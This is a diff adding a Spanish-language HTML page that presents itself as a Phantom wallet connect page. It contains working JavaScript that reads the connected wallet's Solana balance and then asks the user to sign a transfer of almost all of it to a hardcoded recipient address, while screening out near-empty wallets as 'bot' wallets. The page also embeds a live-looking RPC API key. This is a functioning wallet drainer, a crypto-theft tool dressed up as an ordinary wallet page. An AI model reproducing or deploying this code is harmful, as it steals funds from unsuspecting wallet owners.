@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Conectar Phantom Wallet</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+
+    #connect-button, #send-funds-button {
+      background-color: #7e57c2;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 20px;
+    }
+
+    #connect-button:hover, #send-funds-button:hover {
+      background-color: #5e35b1;
+    }
+
+    #wallet-status {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #333;
+    }
+
+    .error {
+      color: red;
+    }
+
+    .success {
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <h1>Conectar Phantom Wallet</h1>
+  <button id="connect-button">Conectar Wallet</button>
+  <div id="wallet-status"></div>
+  <button id="send-funds-button" style="display: none;">Enviar Todos los Fondos</button>
+
+  <script>
+    const connectButton = document.getElementById("connect-button");
+    const sendFundsButton = document.getElementById("send-funds-button");
+    const walletStatusDiv = document.getElementById("wallet-status");
+    let connectedPublicKey = null;
+
+    // Verifica si Phantom Wallet está instalada
+    const isPhantomInstalled = () => {
+      return window.solana && window.solana.isPhantom;
+    };
+
+    // Función para obtener saldo de la wallet
+    const getWalletBalance = async (publicKey) => {
+      try {
+        const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=6f17ef70-139f-463a-bfaa-85a120eee8d3", "confirmed");
+        const balance = await connection.getBalance(publicKey);
+        console.log(`Balance en lamports: ${balance}`);
+        return balance / solanaWeb3.LAMPORTS_PER_SOL;
+      } catch (err) {
+        console.error("Error al obtener el saldo:", err);
+        return -1;
+      }
+    };
+
+    // Función para enviar todos los fondos
+    const sendAllFunds = async () => {
+      if (!connectedPublicKey) {
+        alert("No hay una wallet conectada.");
+        return;
+      }
+
+      const recipient = new solanaWeb3.PublicKey("BspM3ijR1wNgxpm6teGe6CUGRzSCwthoPefE2TpCjssb");
+      const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=6f17ef70-139f-463a-bfaa-85a120eee8d3", "confirmed");
+
+      try {
+        const latestBlockhash = await connection.getLatestBlockhash();
+        const transaction = new solanaWeb3.Transaction({
+          recentBlockhash: latestBlockhash.blockhash,
+          feePayer: connectedPublicKey
+        });
+
+        // Obtiene el saldo actual
+        const balance = await connection.getBalance(connectedPublicKey);
+        if (balance <= 0) {
+          walletStatusDiv.innerHTML = `<span class="error">No hay fondos disponibles para enviar.</span>`;
+          return;
+        }
+
+        // Agrega una instrucción para transferir todos los fondos
+        transaction.add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: connectedPublicKey,
+            toPubkey: recipient,
+            lamports: balance - 5000 // Deja espacio para la comisión de red
+          })
+        );
+
+        // Solicita la firma del usuario
+        const signedTransaction = await window.solana.signTransaction(transaction);
+
+        // Envía la transacción
+        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
+        await connection.confirmTransaction(txid, "confirmed");
+
+        walletStatusDiv.innerHTML = `
+          <span class="success">Fondos enviados exitosamente. TXID: ${txid}</span>
+        `;
+        sendFundsButton.style.display = "none";
+      } catch (err) {
+        console.error("Error al enviar los fondos:", err);
+        walletStatusDiv.innerHTML = `<span class="error">Error al enviar los fondos.</span>`;
+      }
+    };
+
+    // Función para conectar la wallet y verificar saldo
+    const connectWallet = async () => {
+      if (!isPhantomInstalled()) {
+        alert("Phantom Wallet no está instalada. Por favor, instálala desde https://phantom.app");
+        return;
+      }
+
+      try {
+        const response = await window.solana.connect();
+        connectedPublicKey = response.publicKey;
+
+        const balance = await getWalletBalance(connectedPublicKey);
+
+        if (balance < 0) {
+          walletStatusDiv.innerHTML = `<span class="error">Error al obtener el saldo. Intenta nuevamente.</span>`;
+          return;
+        }
+
+        if (balance > 0.00001) {
+          walletStatusDiv.innerHTML = `
+            <span class="success">Wallet conectada: ${connectedPublicKey.toString()} | Saldo: ${balance.toFixed(4)} SOL</span>
+          `;
+          connectButton.textContent = "Conectado";
+          connectButton.disabled = true;
+
+          // Muestra el botón para enviar fondos
+          sendFundsButton.style.display = "inline-block";
+
+          // Agrega el listener al botón de enviar fondos
+          sendFundsButton.addEventListener("click", sendAllFunds);
+        } else {
+          walletStatusDiv.innerHTML = `
+            <span class="error">Bot wallet detected (Saldo: ${balance.toFixed(4)} SOL)</span>
+          `;
+        }
+      } catch (err) {
+        console.error("Error al conectar la wallet:", err);
+      }
+    };
+
+    connectButton.addEventListener("click", connectWallet);
+
+    if (!isPhantomInstalled()) {
+      walletStatusDiv.textContent = "Phantom Wallet no está instalada.";
+    }
+  </script>
+
+  <!-- Incluye la librería de Solana Web3.js -->
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.80.0/lib/index.iife.min.js"></script>
+</body>
+</html>
